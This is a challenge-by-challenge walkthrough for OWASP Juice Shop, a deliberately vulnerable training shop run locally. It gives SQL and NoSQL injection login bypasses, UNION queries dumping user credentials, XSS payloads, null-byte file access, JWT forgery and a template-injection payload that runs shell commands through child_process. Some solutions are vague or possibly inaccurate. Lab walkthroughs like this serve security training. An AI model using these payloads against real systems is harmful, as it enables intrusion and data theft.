# OWASP Juice Shop - Complete Walkthrough

## 🎯 Challenge Solutions by Difficulty

---

## Setup

```bash
# Option 1: Docker
docker run -d -p 3000:3000 --name juice-shop bkimminich/juice-shop

# Option 2: Node.js
git clone https://github.com/juice-shop/juice-shop.git
cd juice-shop
npm install
npm start

# Access: http://localhost:3000
```

---

## ⭐ 1-Star Challenges (Easy)

### 1. Find the Score Board
**Category:** Information Disclosure

**Solution:**
```
Navigate to: http://localhost:3000/#/score-board

How to discover:
1. Open DevTools → Sources
2. Search for "score" in JS files
3. Find route in main.js
```

### 2. Bonus Payload (DOM XSS)
**Category:** XSS

**Solution:**
```html
Search for:
<iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true"></iframe>
```

### 3. Confidential Document
**Category:** Sensitive Data Exposure

**Solution:**
```
1. Go to: http://localhost:3000/ftp
2. Download: acquisitions.md
```

### 4. Error Handling
**Category:** Security Misconfiguration

**Solution:**
```
Visit: http://localhost:3000/rest/qwertz
(Any non-existent API endpoint shows stack trace)
```

### 5. Missing Encoding
**Category:** Improper Input Validation

**Solution:**
```
1. Go to photo wall
2. Click on image with broken URL
3. URL shows: /#/photo-wall
4. Notice URL encoding issue
```

### 6. Outdated Allowlist
**Category:** Unvalidated Redirects

**Solution:**
```
Visit: http://localhost:3000/redirect?to=https://blockchain.info/address/1AbKfgvw9psQ41NbLi8kufDQTezwG8DRZm
```

### 7. Privacy Policy
**Category:** Miscellaneous

**Solution:**
```
1. Go to: http://localhost:3000/#/privacy-security/privacy-policy
2. Or find link in Account menu
```

### 8. Repetitive Registration
**Category:** Improper Input Validation

**Solution:**
```
1. Register new account
2. Use Burp to intercept
3. Change "passwordRepeat" to different value
4. Request still succeeds
```

### 9. Zero Stars
**Category:** Improper Input Validation

**Solution:**
```
1. Submit a review with stars
2. Intercept with Burp
3. Change rating to 0
4. Submit
```

---

## ⭐⭐ 2-Star Challenges (Medium)

### 10. Admin Section
**Category:** Broken Access Control

**Solution:**
```
1. Login as admin (see challenge below)
2. Navigate to: http://localhost:3000/#/administration
```

### 11. Deprecated Interface
**Category:** Security Misconfiguration

**Solution:**
```
Use B2B interface (old XML order):
POST /file-upload
Content-Type: application/xml

<?xml version="1.0"?>
<order>
  <item>test</item>
</order>
```

### 12. Five-Star Feedback
**Category:** Broken Access Control

**Solution:**
```
1. Post feedback as any user
2. Intercept with Burp
3. Change rating to 5
4. Change UserId to admin's ID
```

### 13. Login Admin
**Category:** SQL Injection

**Solution:**
```
Email: admin@juice-sh.op'--
Password: anything

OR

Email: ' OR 1=1--
Password: anything
```

### 14. Login MC SafeSearch
**Category:** Sensitive Data Exposure

**Solution:**
```
1. Search for "mc safesearch" on web
2. Find rapper's song
3. Password from lyrics: "Mr. N00dles"
Email: mc.safesearch@juice-sh.op
Password: Mr. N00dles
```

### 15. Password Strength
**Category:** Broken Authentication

**Solution:**
```
Brute force admin password:
Email: admin@juice-sh.op
Password: admin123
```

### 16. Security Policy
**Category:** Miscellaneous

**Solution:**
```
Visit: http://localhost:3000/security.txt
(or /.well-known/security.txt)
```

### 17. View Basket
**Category:** Broken Access Control

**Solution:**
```
1. Login as any user
2. Open DevTools → Application → Session Storage
3. Change "bid" value to another user's basket ID
4. Refresh page
```

### 18. Weird Crypto
**Category:** Cryptographic Issues

**Solution:**
```
1. Create account
2. Check password reset token
3. Notice MD5 or weak hash
4. Or find encoded values in responses
```

---

## ⭐⭐⭐ 3-Star Challenges (Hard)

### 19. Admin Registration
**Category:** Improper Input Validation

**Solution:**
```
POST /api/Users
{
  "email": "admin2@juice-sh.op",
  "password": "admin123",
  "role": "admin"
}

Intercept normal registration and add "role":"admin"
```

### 20. Bjoern's Favorite Pet
**Category:** Broken Authentication

**Solution:**
```
1. Find Bjoern's info online
2. Security question: "Name of your favorite pet?"
3. Answer: "Zaya" (his cat from Twitter)
Email: user@example.com
```

### 21. CAPTCHA Bypass
**Category:** Broken Anti-Automation

**Solution:**
```
1. Solve CAPTCHA once
2. Intercept subsequent request
3. Replay without solving CAPTCHA
4. Or find CAPTCHA answer in response
```

### 22. Change Bender's Password
**Category:** Broken Authentication

**Solution:**
```
1. Use forgot password for bender@juice-sh.op
2. Security question: "Company you first worked for?"
3. Answer: "Stop'n'Drop" (Futurama reference)
```

### 23. Client-side XSS Protection
**Category:** XSS

**Solution:**
```
1. Register with XSS in email (blocked client-side)
2. Intercept with Burp
3. Send: {"email":"<script>alert('xss')</script>@x.com"}
```

### 24. Database Schema
**Category:** SQL Injection

**Solution:**
```
Search: ')) UNION SELECT sql,2,3,4,5,6,7,8,9 FROM sqlite_master--
```

### 25. Forged Feedback
**Category:** Broken Access Control

**Solution:**
```
1. Post feedback
2. Intercept request
3. Change UserId to another user
4. Feedback posted as them
```

### 26. Forged Review
**Category:** Broken Access Control

**Solution:**
```
PUT /rest/products/1/reviews
{
  "message": "Hacked review",
  "author": "admin@juice-sh.op"
}
```

### 27. GDPR Data Erasure
**Category:** Broken Access Control

**Solution:**
```
1. Login as any user
2. Request data erasure
3. Verify account deleted
```

### 28. Login Amy
**Category:** Sensitive Data Exposure

**Solution:**
```
Email: amy@juice-sh.op
Password: K1f... (from Futurama - Kif's last name)
```

### 29. Login Bender
**Category:** Cryptographic Issues

**Solution:**
```
Email: bender@juice-sh.op
Password: OhG0dPlease1444662145 (derived from hash)
```

### 30. Manipulate Basket
**Category:** Broken Access Control

**Solution:**
```
1. Add item to your basket
2. Intercept request
3. Change BasketId to another user's
4. Item added to their basket
```

### 31. Payback Time
**Category:** Improper Input Validation

**Solution:**
```
1. Add item to basket
2. Intercept quantity change
3. Set quantity to negative: -100
4. Checkout with negative total (they pay you!)
```

### 32. Privacy Policy Inspection
**Category:** Security Through Obscurity

**Solution:**
```
1. Read privacy policy
2. Find hidden link/text
3. Inspect with DevTools for hidden elements
```

### 33. Product Tampering
**Category:** Broken Access Control

**Solution:**
```
PUT /api/Products/1
{
  "description": "Hacked product description"
}
```

### 34. Reset Jim's Password
**Category:** Broken Authentication

**Solution:**
```
Email: jim@juice-sh.op
Security question: "Your eldest siblings middle name?"
Answer: "Samuel" (Star Trek reference - James T. Kirk's brother)
```

### 35. Upload Size
**Category:** Improper Input Validation

**Solution:**
```
1. Upload file > 100KB
2. Intercept and remove size limit check
3. Or use curl to bypass client validation
```

### 36. Upload Type
**Category:** Improper Input Validation

**Solution:**
```
1. Try to upload .pdf (allowed)
2. Rename .exe to .pdf
3. Or use double extension: shell.php.pdf
4. Or null byte: shell.php%00.pdf
```

---

## ⭐⭐⭐⭐ 4-Star Challenges (Very Hard)

### 37. Access Log
**Category:** Sensitive Data Exposure

**Solution:**
```
Visit: http://localhost:3000/support/logs
(After enabling through poison null byte in redirect)
```

### 38. Christmas Special
**Category:** SQL Injection

**Solution:**
```
Search: '))UNION SELECT 1,2,3,4,5,6,7,8,9 FROM Products WHERE deletedAt IS NOT NULL--
(Find the deleted Christmas product)
```

### 39. Easter Egg
**Category:** Broken Access Control

**Solution:**
```
1. Go to /ftp
2. Download eastere.gg using null byte:
   /ftp/eastere.gg%2500.md
```

### 40. Expired Coupon
**Category:** Improper Input Validation

**Solution:**
```
Apply coupon: WMNSDY2019
(Works despite being expired)
```

### 41. Forgotten Developer Backup
**Category:** Sensitive Data Exposure

**Solution:**
```
Download: /ftp/package.json.bak%2500.md
Contains developer secrets
```

### 42. Forgotten Sales Backup
**Category:** Sensitive Data Exposure

**Solution:**
```
Download: /ftp/coupons_2013.md.bak%2500.md
```

### 43. JWT Issues
**Category:** Vulnerable Components

**Solution:**
```
1. Decode JWT from localStorage
2. Change algorithm to "none"
3. Remove signature
4. Change payload (role, id)
5. Use modified token
```

### 44. Misplaced Signature File
**Category:** Sensitive Data Exposure

**Solution:**
```
Download: /ftp/suspicious_errors.yml%2500.md
```

### 45. NoSQL Injection
**Category:** Injection

**Solution:**
```
Login with:
Email: admin@juice-sh.op
Password: {"$gt": ""}

(MongoDB operator injection)
```

### 46. Poison Null Byte
**Category:** Improper Input Validation

**Solution:**
```
/ftp/package.json.bak%00.md
%00 terminates string, bypasses extension check
```

### 47. Reset Bjoern's Password
**Category:** Broken Authentication

**Solution:**
```
Email: bjoern@owasp.org
Security question: "What's your favorite place?"
Answer: "West-Town" (from OWASP bio)
```

### 48. Steganography
**Category:** Security Through Obscurity

**Solution:**
```
1. Download image from photo wall
2. Use steghide or similar tool
3. Extract hidden data
```

### 49. User Credentials
**Category:** SQL Injection

**Solution:**
```
Search: ')) UNION SELECT email,password,3,4,5,6,7,8,9 FROM Users--

Reveals all user credentials (hashed passwords)
```

---

## ⭐⭐⭐⭐⭐ 5-Star Challenges (Expert)

### 50. Change Password
**Category:** Broken Access Control

**Solution:**
```
1. Login as any user
2. Use CSRF to change another user's password
3. Or exploit password reset flow
```

### 51. Extra Language
**Category:** Broken Access Control

**Solution:**
```
1. Find language files in assets
2. Create new language file
3. Submit through vulnerable upload
```

### 52. Forged Signed JWT
**Category:** Vulnerable Components

**Solution:**
```
1. Find JWT secret (in code or logs)
2. Create new JWT with admin role
3. Sign with correct secret
4. Use forged token
```

### 53. Premium Paywall
**Category:** Cryptographic Issues

**Solution:**
```
1. Find how premium content is checked
2. Bypass client-side check
3. Or forge premium token
```

### 54. RCE (Remote Code Execution)
**Category:** Injection

**Solution:**
```
Upload malicious file or exploit SSTI:
{{constructor.constructor('return this.process.mainModule.require("child_process").execSync("whoami").toString()')()}}
```

### 55. SSTi (Server-Side Template Injection)
**Category:** Injection

**Solution:**
```
In user profile or product review:
#{7*7}
${7*7}
{{7*7}}

If 49 appears, SSTI confirmed!
```

### 56. Supply Chain Attack
**Category:** Vulnerable Components

**Solution:**
```
1. Find vulnerable npm package
2. Exploit known CVE
3. Or poison package dependency
```

---

## 🏆 Tips for Success

1. **Use Burp Suite** - Intercept everything
2. **Read the Source** - JavaScript contains hints
3. **Check DevTools** - Network, Storage, Console
4. **Try SQLi Everywhere** - Search, login, forms
5. **Decode Everything** - Base64, JWT, URL encoding
6. **Check /ftp** - Hidden files available
7. **Null Bytes** - %00 bypasses many checks
8. **Think Like a Hacker** - What would break?

---

## 🔧 Useful Tools

- Burp Suite
- OWASP ZAP
- SQLMap
- jwt.io
- CyberChef (encoding/decoding)
- Browser DevTools

---

*Good luck and happy hacking!*

